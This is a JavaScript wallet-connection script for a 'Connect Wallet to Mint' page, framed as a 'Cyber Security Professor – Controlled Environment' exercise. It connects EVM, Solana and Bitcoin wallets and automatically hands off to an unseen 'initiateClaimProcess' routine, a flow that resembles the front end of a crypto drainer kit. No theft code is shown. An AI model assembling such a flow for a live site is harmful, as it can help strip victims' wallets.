// main.js – Advanced Multi‑Chain Wallet Connector
// Cyber Security Professor – Controlled Environment
// Rewritten with robust connection flow, reduced latency, and comprehensive error handling

import { CONFIG } from './config.js';

;(async function() {
  'use strict';

  // ─── Debug Panel ──────────────────────────────────────────────
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    console.log(msg);
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ─── Device Detection ─────────────────────────────────────────
  function isMobile() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  }
  function isIOS() { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
  function isAndroid() { return /Android/i.test(navigator.userAgent); }
  function isDesktop() { return !isMobile(); }
  function isWindows() { return /Windows/i.test(navigator.userAgent); }
  function isMac() { return /Macintosh|Mac OS X/i.test(navigator.userAgent); }
  function getPlatform() {
    if (isIOS()) return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac()) return 'mac';
    return 'unknown';
  }

  // ─── WebSocket Health Check ──────────────────────────────────
  async function checkWebSocket(retries = 2, delay = 800) {
    for (let i = 0; i < retries; i++) {
      try {
        logDebug(`WebSocket check attempt ${i+1}/${retries}`);
        const result = await new Promise((resolve) => {
          const ws = new WebSocket('wss://relay.walletconnect.com');
          const timeout = setTimeout(() => { ws.close(); resolve(false); }, 3000);
          ws.onopen = () => { clearTimeout(timeout); ws.close(); resolve(true); };
          ws.onerror = () => { clearTimeout(timeout); ws.close(); resolve(false); };
        });
        if (result) { logDebug('✅ WebSocket reachable'); return true; }
        await new Promise(r => setTimeout(r, delay));
      } catch (e) { logDebug(`WebSocket exception: ${e.message}`); }
    }
    logDebug('⚠️ WebSocket check failed – proceeding anyway');
    return false;
  }

  // ─── Dynamic Library Loader (cached, lazy) ──────────────────
  let SignClientClass = null;
  let WalletConnectModalClass = null;
  let librariesLoaded = false;
  let loadingLibraries = null;

  async function loadWalletConnectLibraries() {
    if (librariesLoaded) return { SignClient: SignClientClass, WalletConnectModal: WalletConnectModalClass };
    if (loadingLibraries) return loadingLibraries;

    loadingLibraries = (async () => {
      const cdns = [
        'https://esm.sh/@walletconnect/sign-client@2.11.0',
        'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
        'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm'
      ];
      const modalCdns = [
        'https://esm.sh/@walletconnect/modal@2.6.2',
        'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
        'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm'
      ];

      let SignClient, WalletConnectModal;
      for (const url of cdns) {
        try {
          logDebug(`Loading SignClient from ${url}`);
          const mod = await import(url);
          SignClient = mod.default || mod;
          logDebug(`✅ SignClient loaded from ${url}`);
          break;
        } catch (e) { logDebug(`❌ Failed: ${e.message}`); }
      }
      if (!SignClient) throw new Error('Could not load SignClient');

      for (const url of modalCdns) {
        try {
          logDebug(`Loading WalletConnectModal from ${url}`);
          const mod = await import(url);
          WalletConnectModal = mod.WalletConnectModal || mod.default || mod;
          logDebug(`✅ WalletConnectModal loaded from ${url}`);
          break;
        } catch (e) { logDebug(`❌ Failed: ${e.message}`); }
      }
      if (!WalletConnectModal) throw new Error('Could not load WalletConnectModal');

      SignClientClass = SignClient;
      WalletConnectModalClass = WalletConnectModal;
      librariesLoaded = true;
      return { SignClient, WalletConnectModal };
    })();

    return loadingLibraries;
  }

  // ─── DOM Refs ──────────────────────────────────────────────────
  const connectButton = document.getElementById('connectButton');
  const walletButton = document.getElementById('walletButton');
  const claimStatus = document.getElementById('claimStatus');
  let currentSession = null;
  let client = null;
  let modal = null;

  // ─── UI Helpers ────────────────────────────────────────────────
  function setButtonState(button, state, message = '') {
    if (!button) return;
    button.style.display = 'inline-block';
    button.style.padding = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight = '600';
    button.style.border = 'none';
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.transition = 'all 0.3s ease';
    button.style.color = 'white';
    button.style.fontSize = '16px';
    button.style.fontFamily = "'Inter', sans-serif";
    button.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)';
    button.style.minWidth = '180px';
    button.disabled = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.style.boxShadow = '0 2px 8px rgba(102, 102, 102, 0.3)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.style.boxShadow = '0 4px 12px rgba(16, 185, 129, 0.3)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.style.boxShadow = '0 4px 12px rgba(239, 68, 68, 0.3)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
        button.onmouseenter = () => {
          if (!button.disabled) {
            button.style.transform = 'translateY(-2px)';
            button.style.boxShadow = '0 6px 16px rgba(255, 107, 0, 0.4)';
          }
        };
        button.onmouseleave = () => {
          button.style.transform = 'translateY(0)';
          button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)';
        };
        break;
    }
  }

  function showStatus(message, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = message;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    claimStatus.style.transition = 'all 0.3s ease';

    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => {
        claimStatus.style.opacity = '0';
        setTimeout(() => {
          claimStatus.style.display = 'none';
          claimStatus.style.opacity = '1';
        }, 300);
      }, 5000);
    }
  }

  // ─── Storage Helpers ──────────────────────────────────────────
  function saveWallet(address, session = null, chainType = null) {
    localStorage.setItem('connectedWallet', address);
    if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session));
    if (chainType) localStorage.setItem('chainType', chainType);
    else {
      const detected = getChainType();
      if (detected !== 'unknown') localStorage.setItem('chainType', detected);
    }
  }
  function getSavedWallet() { return localStorage.getItem('connectedWallet'); }
  function getSavedSession() {
    const session = localStorage.getItem('walletConnectSession');
    return session ? JSON.parse(session) : null;
  }
  function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown'; }
  function clearSavedWallet() {
    localStorage.removeItem('connectedWallet');
    localStorage.removeItem('walletConnectSession');
    localStorage.removeItem('chainType');
  }

  // ─── Chain Detection ──────────────────────────────────────────
  function getChainType() {
    if (window.unisat) return 'bitcoin';
    if (window.solana && typeof window.solana.connect === 'function') return 'solana';
    if (window.ethereum) return 'evm';
    return 'unknown';
  }

  // ─── UI Update with Badge ─────────────────────────────────────
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
        box-shadow: 0 2px 8px rgba(5, 150, 105, 0.1);
      `;
      connectButton.parentNode.appendChild(display);
    }

    const formatted = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${formatted}</span>
        <span style="background:#1F2937; color:white; padding:2px 10px; border-radius:12px; font-size:12px; font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none; border:none; color:#059669; cursor:pointer; padding:4px;" title="Copy address">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    document.getElementById('copyAddress').addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const btn = document.getElementById('copyAddress');
        const orig = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i>';
        btn.style.color = '#10B981';
        setTimeout(() => {
          btn.innerHTML = orig;
          btn.style.color = '#059669';
        }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    const display = document.getElementById('connectedAddressDisplay');
    if (display) display.remove();
    showStatus('Wallet disconnected', 'info');
  }

  // ─── Solana Wallet Detection ──────────────────────────────────
  function getSolanaWallets() {
    const wallets = [];
    const phantom = window.phantom?.solana || window.solana;
    if (phantom?.isPhantom) wallets.push({ name: 'Phantom', provider: phantom });
    if (window.solflare) wallets.push({ name: 'Solflare', provider: window.solflare });
    if (window.backpack) wallets.push({ name: 'Backpack', provider: window.backpack });
    if (window.coinbaseSolana) wallets.push({ name: 'Coinbase', provider: window.coinbaseSolana });
    if (window.trustWallet?.solana) wallets.push({ name: 'Trust', provider: window.trustWallet.solana });
    return wallets;
  }

  // ─── EIP‑6963 Provider Discovery ─────────────────────────────
  let evmProviders = [];
  let eip6963Resolve = null;
  const eip6963Ready = new Promise(resolve => { eip6963Resolve = resolve; });

  function setupEIP6963() {
    if (window._eip6963SetupDone) return;
    window._eip6963SetupDone = true;

    window.addEventListener('eip6963:announceProvider', (event) => {
      const detail = event.detail;
      if (!evmProviders.some(p => p.info.uuid === detail.info.uuid)) {
        evmProviders.push(detail);
        logDebug(`EIP‑6963: Found ${detail.info.name} (${detail.info.rdns})`);
        if (eip6963Resolve) eip6963Resolve();
      }
    });

    window.dispatchEvent(new Event('eip6963:requestProvider'));
    // Also check after a short delay for late announcements
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
    // Resolve anyway after 2 seconds to not block
    setTimeout(() => { if (eip6963Resolve) eip6963Resolve(); }, 2000);
  }

  // ─── Wallet Selection Modal (EVM) ─────────────────────────────
  function showWalletSelectionModal(providers, callback) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position: fixed; top:0; left:0; width:100%; height:100%;
      background: rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center;
      z-index: 99999;
    `;
    const modalDiv = document.createElement('div');
    modalDiv.style.cssText = `
      background: #1F2937; padding: 24px; border-radius: 16px; max-width: 400px; width: 90%;
      color: white; font-family: 'Inter', sans-serif;
      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
    `;
    modalDiv.innerHTML = `
      <h3 style="margin-top:0; font-weight:600; font-size:20px;">Select a Wallet</h3>
      <div id="walletList" style="display:flex; flex-direction:column; gap:10px; margin:16px 0;"></div>
      <button id="cancelWalletSelect" style="background:none; border:1px solid #666; color:#ccc; padding:8px 16px; border-radius:8px; cursor:pointer; width:100%;">Cancel</button>
    `;
    overlay.appendChild(modalDiv);
    document.body.appendChild(overlay);

    const list = modalDiv.querySelector('#walletList');
    providers.forEach((provider) => {
      const btn = document.createElement('button');
      btn.textContent = provider.info.name;
      btn.style.cssText = `
        background: #374151; border:none; padding:12px 16px; border-radius:8px;
        color:white; font-size:16px; cursor:pointer; transition:background 0.2s;
        text-align:left; display:flex; align-items:center; gap:10px;
      `;
      btn.onmouseover = () => btn.style.background = '#4B5563';
      btn.onmouseout = () => btn.style.background = '#374151';
      if (provider.info.icon) {
        const img = document.createElement('img');
        img.src = provider.info.icon;
        img.style.width = '24px';
        img.style.height = '24px';
        btn.prepend(img);
      }
      btn.addEventListener('click', () => {
        overlay.remove();
        callback(provider);
      });
      list.appendChild(btn);
    });

    modalDiv.querySelector('#cancelWalletSelect').addEventListener('click', () => {
      overlay.remove();
      callback(null);
    });
  }

  // ─── WalletConnect Initialization ─────────────────────────────
  async function initWalletConnect(useTestId = false) {
    if (client && modal) return true;

    const { PROJECT_ID, PUBLIC_TEST_ID, DAPP_METADATA } = CONFIG;
    const projectId = useTestId ? PUBLIC_TEST_ID : PROJECT_ID;

    const wsOk = await checkWebSocket(2, 800);
    if (!wsOk) logDebug('⚠️ WebSocket not reachable, but continuing');

    try {
      const libs = await loadWalletConnectLibraries();
      const { SignClient, WalletConnectModal } = libs;

      client = await SignClient.init({
        projectId,
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com',
      });

      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
          '--wcm-font-family': "'Inter', sans-serif",
        },
        enableExplorer: true,
        explorerRecommendedWalletIds: [
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
          'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa',
          'ecc4036f814562b41a5268adc86270fba1365471402006302e70169465b7ac18',
        ],
        explorerExcludedWalletIds: [],
        mobileWallets: [
          { id: 'metamask', name: 'MetaMask', links: { native: 'metamask://', universal: 'https://metamask.app.link/' } },
          { id: 'trust', name: 'Trust Wallet', links: { native: 'trust://', universal: 'https://link.trustwallet.com/' } },
          { id: 'rainbow', name: 'Rainbow', links: { native: 'rainbow://', universal: 'https://rnbwapp.com/' } },
          { id: 'coinbase', name: 'Coinbase Wallet', links: { native: 'coinbasewallet://', universal: 'https://go.cb-w.com/' } },
        ],
      });
      logDebug('✅ WalletConnect initialized');
      return true;
    } catch (error) {
      logDebug(`❌ WalletConnect init failed: ${error.message}`);
      return false;
    }
  }

  // ─── Direct EVM Connection (Desktop) ──────────────────────────
  async function connectDirectEVM(retries = 2) {
    setupEIP6963();
    await eip6963Ready; // wait for providers

    let providers = evmProviders.filter(p => p.provider);
    // Fallback to window.ethereum if no EIP-6963 providers
    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: 'Injected Wallet', rdns: 'io.injected', icon: '' },
        provider: window.ethereum
      }];
    }

    if (providers.length === 0) {
      logDebug('No EVM providers found');
      return false;
    }

    // Select provider: if multiple, let user choose, otherwise auto-select MetaMask or first
    let chosenProvider = null;
    if (providers.length === 1) {
      chosenProvider = providers[0];
    } else {
      // Prefer MetaMask
      const metaMask = providers.find(p => p.info.rdns === 'io.metamask' || p.info.name.toLowerCase().includes('metamask'));
      if (metaMask) {
        chosenProvider = metaMask;
      } else {
        // Show selection modal
        const selected = await new Promise((resolve) => {
          showWalletSelectionModal(providers, (provider) => resolve(provider));
        });
        if (!selected) return false; // user cancelled
        chosenProvider = selected;
      }
    }

    let attempt = 0;
    while (attempt < retries) {
      attempt++;
      try {
        logDebug(`Direct EVM attempt ${attempt}/${retries} with ${chosenProvider.info.name}`);
        const provider = chosenProvider.provider;
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        if (accounts && accounts.length > 0) {
          const address = accounts[0];
          logDebug(`✅ Direct EVM connected: ${address}`);
          saveWallet(address, null, 'evm');
          updateConnectedUI(address, 'evm');
          setupEVMProviderEvents(provider);
          return true;
        }
      } catch (err) {
        logDebug(`⚠️ Direct EVM attempt ${attempt} failed: ${err.message}`);
        if (err.code === 4001) { // user rejected
          logDebug('User rejected – aborting direct attempts');
          break;
        }
        await new Promise(r => setTimeout(r, 800));
      }
    }
    logDebug('❌ Direct EVM failed');
    return false;
  }

  // ─── WalletConnect EVM Connection (Universal) ──────────────────
  async function connectViaWalletConnect(useTestId = false) {
    const initSuccess = await initWalletConnect(useTestId);
    if (!initSuccess) {
      showStatus('WalletConnect service unavailable', 'error');
      return false;
    }

    try {
      showStatus('Requesting wallet connection...', 'info');
      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains: ['eip155:1'],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });

      if (uri) {
        logDebug(`WC URI: ${uri}`);
        modal.openModal({ uri });
        showStatus('Select your wallet or scan QR code', 'info');

        // Mobile deeplink attempt (only for mobile)
        if (isMobile()) {
          const platform = getPlatform();
          logDebug(`Mobile platform: ${platform}, attempting deeplink`);
          // Use the modal's internal deeplink or our own
          // For iOS, try universal links; for Android, the modal's "Open" button handles intents.
          // We'll also store the URI for possible return detection.
          sessionStorage.setItem('pending_wc_uri', uri);
          sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());
          // The modal itself will have an "Open" button that triggers deeplink.
        } else {
          // Desktop: modal shows QR code; we also store URI for any desktop wallet that supports it.
          sessionStorage.setItem('pending_wc_uri', uri);
          sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());
        }
      }

      const session = await Promise.race([
        approval(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Connection timeout')), 45000)), // reduced from 60s
      ]);

      if (modal) modal.closeModal();
      if (session?.namespaces?.eip155?.accounts?.length) {
        const account = session.namespaces.eip155.accounts[0].split(':')[2];
        logDebug(`✅ WalletConnect session: ${account}`);
        saveWallet(account, session, 'evm');
        updateConnectedUI(account, 'evm');
        currentSession = session;
        sessionStorage.removeItem('pending_wc_uri');
        sessionStorage.removeItem('pending_wc_timestamp');
        return true;
      } else {
        showStatus('No accounts found', 'error');
        return false;
      }
    } catch (err) {
      logDebug(`❌ WalletConnect error: ${err.message}`);
      if (modal) modal.closeModal();
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');
      if (err.message?.includes('User rejected') || err.message?.includes('Cancelled')) {
        showStatus('Connection cancelled by user', 'error');
      } else if (err.message?.includes('timeout')) {
        showStatus('Connection timeout – please try again', 'error');
      } else {
        showStatus('Wallet connection failed', 'error');
      }
      return false;
    }
  }

  // ─── Bitcoin (UniSat) Connection ─────────────────────────────
  async function connectBitcoin() {
    try {
      if (!window.unisat) {
        showStatus('UniSat wallet not installed', 'error');
        return false;
      }
      await window.unisat.requestAccounts();
      const accounts = await window.unisat.getAccounts();
      if (!accounts || accounts.length === 0) throw new Error('No BTC account');
      const address = accounts[0];
      saveWallet(address, null, 'bitcoin');
      updateConnectedUI(address, 'bitcoin');

      if (window.unisat.on) {
        window.unisat.on('accountsChanged', (newAccounts) => {
          if (newAccounts.length === 0) {
            resetConnectedUI();
            clearSavedWallet();
          } else {
            saveWallet(newAccounts[0], null, 'bitcoin');
            updateConnectedUI(newAccounts[0], 'bitcoin');
          }
        });
        window.unisat.on('networkChanged', (network) => {
          showStatus(`Bitcoin network changed to ${network}`, 'info');
        });
      }
      return true;
    } catch (e) {
      logDebug(`BTC error: ${e.message}`);
      showStatus('Bitcoin connection failed: ' + e.message, 'error');
      return false;
    }
  }

  // ─── Solana Connection ────────────────────────────────────────
  async function connectSolana() {
    try {
      const wallets = getSolanaWallets();
      if (wallets.length === 0) {
        showStatus('No Solana wallet found', 'error');
        return false;
      }
      const wallet = wallets[0];
      const provider = wallet.provider;

      let publicKey;
      if (provider.connect) {
        const response = await provider.connect();
        publicKey = response.publicKey?.toString() || response.toString();
      } else if (provider.request) {
        const response = await provider.request({ method: 'connect' });
        publicKey = response.publicKey.toString();
      } else {
        throw new Error('Unsupported provider interface');
      }

      const address = publicKey;
      saveWallet(address, null, 'solana');
      updateConnectedUI(address, 'solana');

      window.solanaProvider = provider;
      window.solanaPublicKey = address;

      if (provider.on) {
        provider.on('accountChanged', (newPubkey) => {
          if (newPubkey) {
            const addr = newPubkey.toString();
            saveWallet(addr, null, 'solana');
            updateConnectedUI(addr, 'solana');
            window.solanaPublicKey = addr;
          } else {
            resetConnectedUI();
            clearSavedWallet();
            window.solanaProvider = null;
            window.solanaPublicKey = null;
          }
        });
        provider.on('disconnect', () => {
          resetConnectedUI();
          clearSavedWallet();
          window.solanaProvider = null;
          window.solanaPublicKey = null;
        });
      }
      return true;
    } catch (e) {
      logDebug(`SOL error: ${e.message}`);
      showStatus('Solana connection failed: ' + e.message, 'error');
      return false;
    }
  }

  // ─── EVM Provider Event Listeners ────────────────────────────
  function setupEVMProviderEvents(provider) {
    if (!provider) return;
    // Remove previous listeners to avoid duplicates
    provider.removeAllListeners?.('accountsChanged');
    provider.removeAllListeners?.('chainChanged');
    provider.removeAllListeners?.('disconnect');

    provider.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
        showStatus('Wallet disconnected', 'info');
      } else {
        updateConnectedUI(accounts[0], 'evm');
        saveWallet(accounts[0], null, 'evm');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1000);
      }
    });
    provider.on('chainChanged', (chainId) => {
      showStatus(`Network changed to ${chainId}`, 'info');
    });
    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
      showStatus('Wallet disconnected', 'info');
    });
  }

  // ─── Main Connect Dispatcher ──────────────────────────────────
  async function connectWallet() {
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Detecting wallet...', 'info');

    let success = false;
    const platform = getPlatform();
    logDebug(`Platform: ${platform} | Mobile: ${isMobile()}`);

    if (isMobile()) {
      // ─── MOBILE: WalletConnect only ──────────────────────────
      logDebug('📱 Mobile – WalletConnect only');
      showStatus('Mobile: Connecting via WalletConnect...', 'info');

      // Try primary project ID, then fallback to public test
      success = await connectViaWalletConnect(false);
      if (!success) {
        logDebug('Retrying WalletConnect with public test ID');
        success = await connectViaWalletConnect(true);
      }

      if (!success) {
        showStatus('Mobile: No compatible wallet found. Please install a WalletConnect wallet.', 'error');
        setButtonState(connectButton, 'failed');
        if (walletButton) setButtonState(walletButton, 'failed');
      } else {
        setButtonState(connectButton, 'connected');
        if (walletButton) setButtonState(walletButton, 'connected');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1500);
      }
      return;
    }

    // ─── DESKTOP: Direct EVM → WalletConnect → Solana → Bitcoin ──
    logDebug('🖥️ Desktop – full connection flow');

    // 1) Direct EVM (with retries)
    logDebug('Desktop: Attempt 1 – Direct EVM');
    success = await connectDirectEVM(2);
    if (success) {
      logDebug('✅ Direct EVM successful');
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1500);
      return;
    }

    // 2) WalletConnect fallback
    logDebug('Desktop: Attempt 2 – WalletConnect');
    success = await connectViaWalletConnect(false);
    if (!success) {
      logDebug('Retrying WalletConnect with public test ID');
      success = await connectViaWalletConnect(true);
    }
    if (success) {
      logDebug('✅ WalletConnect successful');
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1500);
      return;
    }

    // 3) Solana
    logDebug('Desktop: Attempt 3 – Solana');
    const solanaWallets = getSolanaWallets();
    if (solanaWallets.length > 0) {
      success = await connectSolana();
      if (success) {
        logDebug('✅ Solana successful');
        setButtonState(connectButton, 'connected');
        if (walletButton) setButtonState(walletButton, 'connected');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1500);
        return;
      }
    }

    // 4) Bitcoin
    logDebug('Desktop: Attempt 4 – Bitcoin');
    if (window.unisat) {
      success = await connectBitcoin();
      if (success) {
        logDebug('✅ Bitcoin successful');
        setButtonState(connectButton, 'connected');
        if (walletButton) setButtonState(walletButton, 'connected');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1500);
        return;
      }
    }

    // All failed
    logDebug('❌ All connection attempts failed');
    showStatus('No supported wallet found. Please install a wallet.', 'error');
    setButtonState(connectButton, 'failed');
    if (walletButton) setButtonState(walletButton, 'failed');
  }

  // ─── Disconnect ───────────────────────────────────────────────
  async function disconnectWallet() {
    try {
      if (window.solanaProvider && window.solanaProvider.disconnect) {
        await window.solanaProvider.disconnect();
      }
      if (client && currentSession) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        });
        currentSession = null;
      }
    } catch (err) {
      logDebug(`Disconnect error: ${err.message}`);
    }
    resetConnectedUI();
    clearSavedWallet();
    window.solanaProvider = null;
    window.solanaPublicKey = null;
  }

  // ─── Click Handler ────────────────────────────────────────────
  const handleClick = async () => {
    const saved = getSavedWallet();
    if (saved && (currentSession || getSavedChainType() !== 'unknown')) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton) walletButton.addEventListener('click', handleClick);

  // ─── Session Restoration ──────────────────────────────────────
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedChain = getSavedChainType();
    const savedSession = getSavedSession();

    // Check for pending WC redirect (return from wallet)
    const pendingUri = sessionStorage.getItem('pending_wc_uri');
    const pendingTimestamp = sessionStorage.getItem('pending_wc_timestamp');
    if (pendingUri && pendingTimestamp) {
      const elapsed = Date.now() - parseInt(pendingTimestamp);
      if (elapsed < 120000) {
        logDebug('Detected return from wallet – waiting for session...');
        if (client) {
          try {
            await new Promise(r => setTimeout(r, 2000));
            const sessions = client.session.values();
            if (sessions.length > 0) {
              const session = sessions[0];
              const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
              if (account) {
                saveWallet(account, session, 'evm');
                updateConnectedUI(account, 'evm');
                currentSession = session;
                sessionStorage.removeItem('pending_wc_uri');
                sessionStorage.removeItem('pending_wc_timestamp');
                setTimeout(() => {
                  if (typeof window.initiateClaimProcess === 'function') {
                    window.initiateClaimProcess();
                  }
                }, 1000);
                return;
              }
            }
          } catch (e) {
            logDebug(`Session restore after redirect failed: ${e.message}`);
          }
        }
      }
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');
    }

    if (savedWallet && savedChain !== 'unknown') {
      logDebug(`♻️ Restoring ${savedChain} wallet: ${savedWallet}`);

      if (savedChain === 'evm') {
        if (savedSession) {
          const initSuccess = await initWalletConnect(false);
          if (initSuccess) {
            try {
              const session = client.session.get(savedSession.topic);
              if (session) {
                currentSession = session;
                updateConnectedUI(savedWallet, 'evm');
                return;
              }
            } catch (e) { logDebug(`Session restore failed: ${e.message}`); }
          }
        }
        // Try direct provider (desktop)
        if (isDesktop() && window.ethereum) {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' }).catch(() => []);
          if (accounts.length > 0 && accounts[0] === savedWallet) {
            updateConnectedUI(savedWallet, 'evm');
            return;
          }
        }
        // If mobile and no session, clear
        if (isMobile()) {
          clearSavedWallet();
        }
      } else if (savedChain === 'solana') {
        if (isDesktop() && window.solana && window.solana.publicKey) {
          const addr = window.solana.publicKey.toString();
          if (addr === savedWallet) {
            updateConnectedUI(savedWallet, 'solana');
            window.solanaPublicKey = addr;
            window.solanaProvider = window.solana;
            return;
          }
        }
        if (isDesktop()) {
          const success = await connectSolana();
          if (success) return;
        }
        clearSavedWallet();
      } else if (savedChain === 'bitcoin') {
        if (isDesktop() && window.unisat) {
          try {
            const accounts = await window.unisat.getAccounts();
            if (accounts.length > 0 && accounts[0] === savedWallet) {
              updateConnectedUI(savedWallet, 'bitcoin');
              return;
            }
          } catch (e) {}
        }
        clearSavedWallet();
      }
    }
  }

